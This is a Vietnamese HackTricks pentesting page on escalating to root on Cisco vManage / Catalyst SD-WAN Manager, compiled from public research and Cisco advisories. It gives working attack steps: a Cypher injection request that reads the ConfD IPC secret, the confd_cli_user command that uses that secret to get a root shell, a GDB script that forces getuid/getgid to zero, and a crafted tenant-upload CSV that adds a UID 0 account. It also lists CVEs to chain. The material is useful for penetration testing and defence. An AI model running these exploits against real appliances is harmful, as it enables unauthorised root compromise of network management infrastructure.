# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Sau khi có code execution trên Cisco vManage / *Catalyst SD-WAN Manager* với quyền `vmanage`, `netadmin` hoặc `vmanage-admin`, các bề mặt local privesc đáng chú ý nhất thường là stack CLI `confd`, helper `cmdptywrapper`, REST API trên localhost và các trình xử lý import/upload thuộc sở hữu của root.

Nếu bạn vẫn cần foothold ban đầu trên controller, hãy xem trang control-plane chuyên biệt trước:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Phân loại nhanh trên máy local

```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```

Nếu `/etc/confd/confd_ipc_secret` có thể đọc được từ foothold của bạn, Path 1 và Path 2 sẽ khả thi ngay lập tức. Nếu bạn tiếp cận thông qua lỗ hổng tiết lộ tệp từ xa hoặc webshell, hãy kiểm tra thêm thông tin SSH của `vmanage-admin` và các trình xử lý tải lên trong môi trường multitenancy; nghiên cứu gần đây đã chứng minh cả hai đều là các hướng pivot khả thi.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Bản đánh giá vManage của Synacktiv ghi lại con đường này để lấy root shell.<sup>[[5]](#references)</sup>

[Tài liệu ConfD](http://66.218.245.39/doc/html/rn03re18.html) được báo cáo liên kết đến mô tả cơ chế xác thực IPC; ví dụ vManage trong tài liệu đặt secret tại `/etc/confd/confd_ipc_secret` và cho biết người dùng `vmanage` có thể đọc tệp này.<sup>[[5]](#references)</sup>

```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```

Vì Neo4j chạy với quyền `vmanage` trong cấu hình được báo cáo, Cypher injection trước đó có thể đọc file bí mật.<sup>[[5]](#references)</sup>

```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```

Bản thân `confd_cli` không chấp nhận đối số dòng lệnh; nó gọi `/usr/bin/confd_cli_user`. Quy trình được báo cáo trích xuất helper có thể đọc bởi root này từ rootfs, sao chép nó qua `scp`, xem phần trợ giúp, thiết lập `CONFD_IPC_ACCESS_FILE` rồi gọi helper với `-U 0 -G 0` để có được shell root.<sup>[[5]](#references)</sup>

```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```

## Đường dẫn 2

Lộ trình thay thế này được điều chỉnh từ nghiên cứu vManage 19.2.2 của Walmart Global Tech.<sup>[[6]](#references)</sup>

Lộ trình của Synacktiv cần một bản sao của `/usr/bin/confd_cli_user`, tệp này có thể được root đọc trong cấu hình được báo cáo; thay vào đó, báo cáo của Walmart sửa đổi các giá trị danh tính của `confd_cli` bằng GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Bản disassembly trong báo cáo cho thấy `confd_cli` thu thập UID và GID của tiến trình gọi.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump cho thấy việc thu thập UID/GID</summary>

```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```

</details>

Cùng bài kiểm tra đó cho thấy `cmdptywrapper` thuộc sở hữu của root nhận các giá trị `-g` và `-u` được chỉ định rõ ràng.<sup>[[6]](#references)</sup>

```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```

Nhà nghiên cứu suy luận rằng `confd_cli` chuyển tiếp UID và GID của người dùng đã đăng nhập tới `cmdptywrapper`.<sup>[[6]](#references)</sup>

Chạy trực tiếp `cmdptywrapper` với `-g 0 -u 0` không thành công vì không có file descriptor bắt buộc (`-i 1015` trong ví dụ).<sup>[[6]](#references)</sup>

Vì `confd_cli` không cung cấp các giá trị đó dưới dạng đối số, báo cáo sử dụng GDB để ghi đè giá trị trả về của `getuid()` và `getgid()`; GDB có sẵn trên thiết bị đó.<sup>[[5]](#references)[[6]](#references)</sup>

Với quyền truy cập `vmanage`, bài kiểm tra có thể đọc `/etc/confd/confd_ipc_secret`; script sau buộc cả hai lệnh gọi lấy danh tính đều trả về giá trị 0.<sup>[[6]](#references)</sup>

Script GDB được sử dụng trong báo cáo là:<sup>[[6]](#references)</sup>

```
set environment USER=root
define root
   finish
   set $rax=0
   continue
end
break getuid
commands
   root
end
break getgid
commands
   root
end
run
```

Đầu ra console được báo cáo là:<sup>[[6]](#references)</sup>

<details>
<summary>Đầu ra console</summary>

```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```

</details>

## Path 3 (lỗi xác thực đầu vào CLI năm 2025 - CVE-2025-20122)

Sau đó, Cisco đã mô tả một con đường leo thang lên root cục bộ đơn giản hơn trong advisory của hãng về [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). **Attacker đã xác thực, chỉ có quyền chỉ đọc** có thể gửi một request được tạo riêng đến CLI của manager và giành quyền root do quá trình xác thực đầu vào không đầy đủ.<sup>[[7]](#references)</sup>

Từ góc độ tấn công, advisory này cùng với nghiên cứu CLI trước đó gợi ý quy trình sau.<sup>[[6]](#references)[[7]](#references)</sup>

1. Khi đã có *bất kỳ* foothold nào với quyền thấp trên máy, hãy kiểm tra dịch vụ CLI cục bộ trước khi thực hiện quy trình Path 1 / Path 2 tốn công hơn.
2. Dùng lại các artifact từ Path 2 để tìm ranh giới tin cậy: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Xem mọi trường được chuyển tiếp đến backend CLI là đáng ngờ: UID/GID, username, metadata terminal, file được nhập hoặc bất kỳ giá trị nào sau đó được helper sở hữu bởi root sử dụng.
4. Nếu user quyền thấp có thể truy cập socket CLI cục bộ và tác động đến các trường này, thì chỉ cần một request được tạo riêng nữa là có thể lên root.

Sau khi truy cập được appliance, hãy kiểm tra chuỗi CLI cục bộ như sau.<sup>[[6]](#references)[[7]](#references)</sup>

```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```

Điều này biến bug năm 2025 thành một pattern hunting có thể tái sử dụng: tìm **các CLI shim cục bộ thu thập danh tính trong userland rồi chuyển tiếp danh tính đó cho một wrapper có đặc quyền**.<sup>[[6]](#references)[[7]](#references)</sup>

Đừng nhầm **CVE-2025-20122** với **CVE-2026-20122** xuất hiện sau đó: vấn đề năm 2025 là bug *local* từ CLI lên root, còn vấn đề năm 2026 là lỗi ghi đè file tùy ý qua API *remote*, chủ yếu hữu ích để cài foothold rồi tiếp tục xem xét Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (REST API low-priv năm 2026 lên root - CVE-2026-20126)

Thông báo bảo mật tháng 2 năm 2026 của Cisco mô tả một dạng privesc hữu ích khác, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). **Kẻ tấn công cục bộ đã xác thực và có đặc quyền thấp** có thể giành được quyền root do cơ chế xác thực người dùng trong REST API không đủ chặt chẽ.<sup>[[1]](#references)</sup>

Điều này quan trọng vì privesc trên vManage không còn chỉ giới hạn ở việc lạm dụng `confd`/TTY; sau khi có shell low-priv, hãy tìm thêm các mục sau.<sup>[[1]](#references)</sup>

- Các endpoint API chỉ cho phép localhost nhưng quá tin tưởng bên gọi
- Token, cookie hoặc thông tin xác thực dịch vụ mà tài khoản hiện tại có thể đọc
- Các hành động chỉ dành cho root được cung cấp qua handler `dataservice`/REST nhưng vẫn có thể được kích hoạt cục bộ

Trên thực tế, khi đã có shell với tư cách `vmanage` hoặc một service user khác, việc lạm dụng API cục bộ có thể dễ tự động hóa hơn so với việc lạm dụng CLI tương tác.<sup>[[1]](#references)</sup>

```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```

Nếu ngữ cảnh phiên cục bộ đủ để truy cập chức năng REST có đặc quyền, hãy ưu tiên dùng API: cách này dễ phát lại, viết script và kết hợp với các web session hoặc API token bị đánh cắp hơn.<sup>[[1]](#references)</sup>

## Đường dẫn 5 (2026: file được tạo thủ công xử lý bởi root - CVE-2026-20245)

Một kiểu tấn công gần đây khác là [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Kẻ tấn công cục bộ có đặc quyền `netadmin` có thể tải lên một **file được tạo thủ công** mà CLI sau đó xử lý không an toàn, dẫn đến command injection với quyền `root`.<sup>[[2]](#references)</sup>

Theo góc nhìn của HackTricks, kỹ thuật hữu ích ở đây có phạm vi rộng hơn CVE cụ thể này.<sup>[[2]](#references)</sup>

1. Liệt kê mọi quy trình CLI hoặc web chấp nhận file: nhập dữ liệu, gói chẩn đoán, template, trình xác thực, bản sao lưu, dữ liệu tenant, v.v.
2. Theo dõi nơi file tải lên được lưu và script hoặc binary nào thuộc sở hữu của root sẽ xử lý nó.
3. Kiểm tra xem tên file, nội dung file hoặc metadata được phân tích có bao giờ được truyền vào lệnh shell, script wrapper hoặc các hàm hỗ trợ kiểu `system()` hay không.
4. Nếu bạn đã có thể truy cập `netadmin` (thông tin xác thực hợp lệ, session bị đánh cắp hoặc chuỗi auth-bypass), lỗi xử lý file thường là con đường nhanh nhất để lên root.

Sau đó, Google Cloud / Mandiant đã chỉ ra một trường hợp cụ thể thuộc nhóm lỗi này bị khai thác thông qua quy trình nhập dữ liệu multitenancy.<sup>[[4]](#references)</sup>

```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```

Trong cuộc tấn công được quan sát, CSV được tạo riêng đã chỉnh sửa `/etc/passwd` và `/etc/shadow` để tạo một tài khoản UID 0 tạm thời (`troot`). Vì vậy, các trình nhập kiểu `tenant-upload` / `tenant-list` đặc biệt đáng chú ý: chúng không chỉ là tính năng nhập dữ liệu mà còn có thể là các giao diện phân tích cú pháp chạy với quyền root.<sup>[[4]](#references)</sup>

Một mẫu tìm kiếm nhanh từ shell là:

```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```

Lớp lỗi này kết hợp đặc biệt hiệu quả với các foothold từ xa cấp quyền `netadmin` nhưng không phải `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Các lỗ hổng vManage/Catalyst SD-WAN Manager gần đây khác để chain

- **Info leak không cần xác thực (CVE-2026-20133)** – Đặc biệt có giá trị vì nghiên cứu công khai cho thấy lỗ hổng này có thể làm lộ `confd_ipc_secret` hoặc khóa riêng của `vmanage-admin`, biến lỗi đọc thành Path 1 hoặc một NETCONF pivot.<sup>[[3]](#references)</sup>
- **Ghi đè tệp tùy ý qua API đã xác thực (CVE-2026-20122)** – Khác với lỗi CLI năm 2025 ở trên; VulnCheck đã dùng lỗi này để tải lên webshell, khiến các đường privesc cục bộ trên trang này lập tức trở nên phù hợp.<sup>[[3]](#references)</sup>
- **XSS trên UI đã xác thực (CVE-2024-20475)** – Kẻ tấn công đã xác thực có thể thực thi script trong giao diện web của người dùng bị ảnh hưởng; hãy đánh giá xem ngữ cảnh phiên thu được có cho phép thực hiện các thao tác API/CLI dẫn đến `vshell` hoặc một trong các đường privesc cục bộ ở trên hay không.<sup>[[9]](#references)</sup>
- **Bypass xác thực từ xa để có quyền `netadmin` (CVE-2026-20129)** – Tiền đề rất thuận lợi cho Path 5 vì `netadmin` chính là cấp quyền cần thiết để khai thác privesc bằng tệp được tạo thủ công năm 2026.<sup>[[2]](#references)[[3]](#references)</sup>
- **Ghi tệp tùy ý đã xác thực (CVE-2026-20262)** – Có giá trị tấn công tương tự CVE-2026-20122, nhưng thông qua một đường tải lên trên UI web được bổ sung sau đó; Cisco cho biết tệp được tạo hoặc ghi đè bằng lỗi này có thể được dùng về sau để nâng quyền lên `root`.<sup>[[10]](#references)</sup>
- **Hạ cấp để khôi phục lỗi privesc CLI cũ (CVE-2022-20775)** – Các vụ xâm nhập năm 2026 cho thấy kẻ tấn công có thể quay lại một bản dựng SD-WAN cũ dễ bị tấn công, khai thác lỗi CLI cũ để có quyền root, rồi khôi phục phiên bản ban đầu.<sup>[[8]](#references)</sup>
- **Bypass xác thực control-plane trước xác thực (CVE-2026-20182)** – Được trình bày chi tiết hơn trên trang riêng về SD-WAN control-plane; lỗi này có thể thêm khóa SSH cho `vmanage-admin`, cung cấp quyền truy cập NETCONF lâu dài để thực hiện các hành động tiếp theo trên management-plane.<sup>[[11]](#references)</sup>



## References

- [1] [Các lỗ hổng Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, v.v.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Lỗ hổng nâng quyền đã xác thực trong Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager và Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Dồn mèo - Các lỗ hổng gần đây trong Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Khai thác zero-day lỗ hổng (CVE-2026-20245) trong Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Phần 1: Tấn công vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — Từ CSRF đến thực thi mã từ xa](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Lỗ hổng nâng quyền trong Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616 đang tích cực khai thác Cisco Catalyst SD-WAN (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Lỗ hổng Cross-Site Scripting trong Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Lỗ hổng ghi tệp tùy ý trong Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Lỗ hổng bypass xác thực nghiêm trọng trong Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
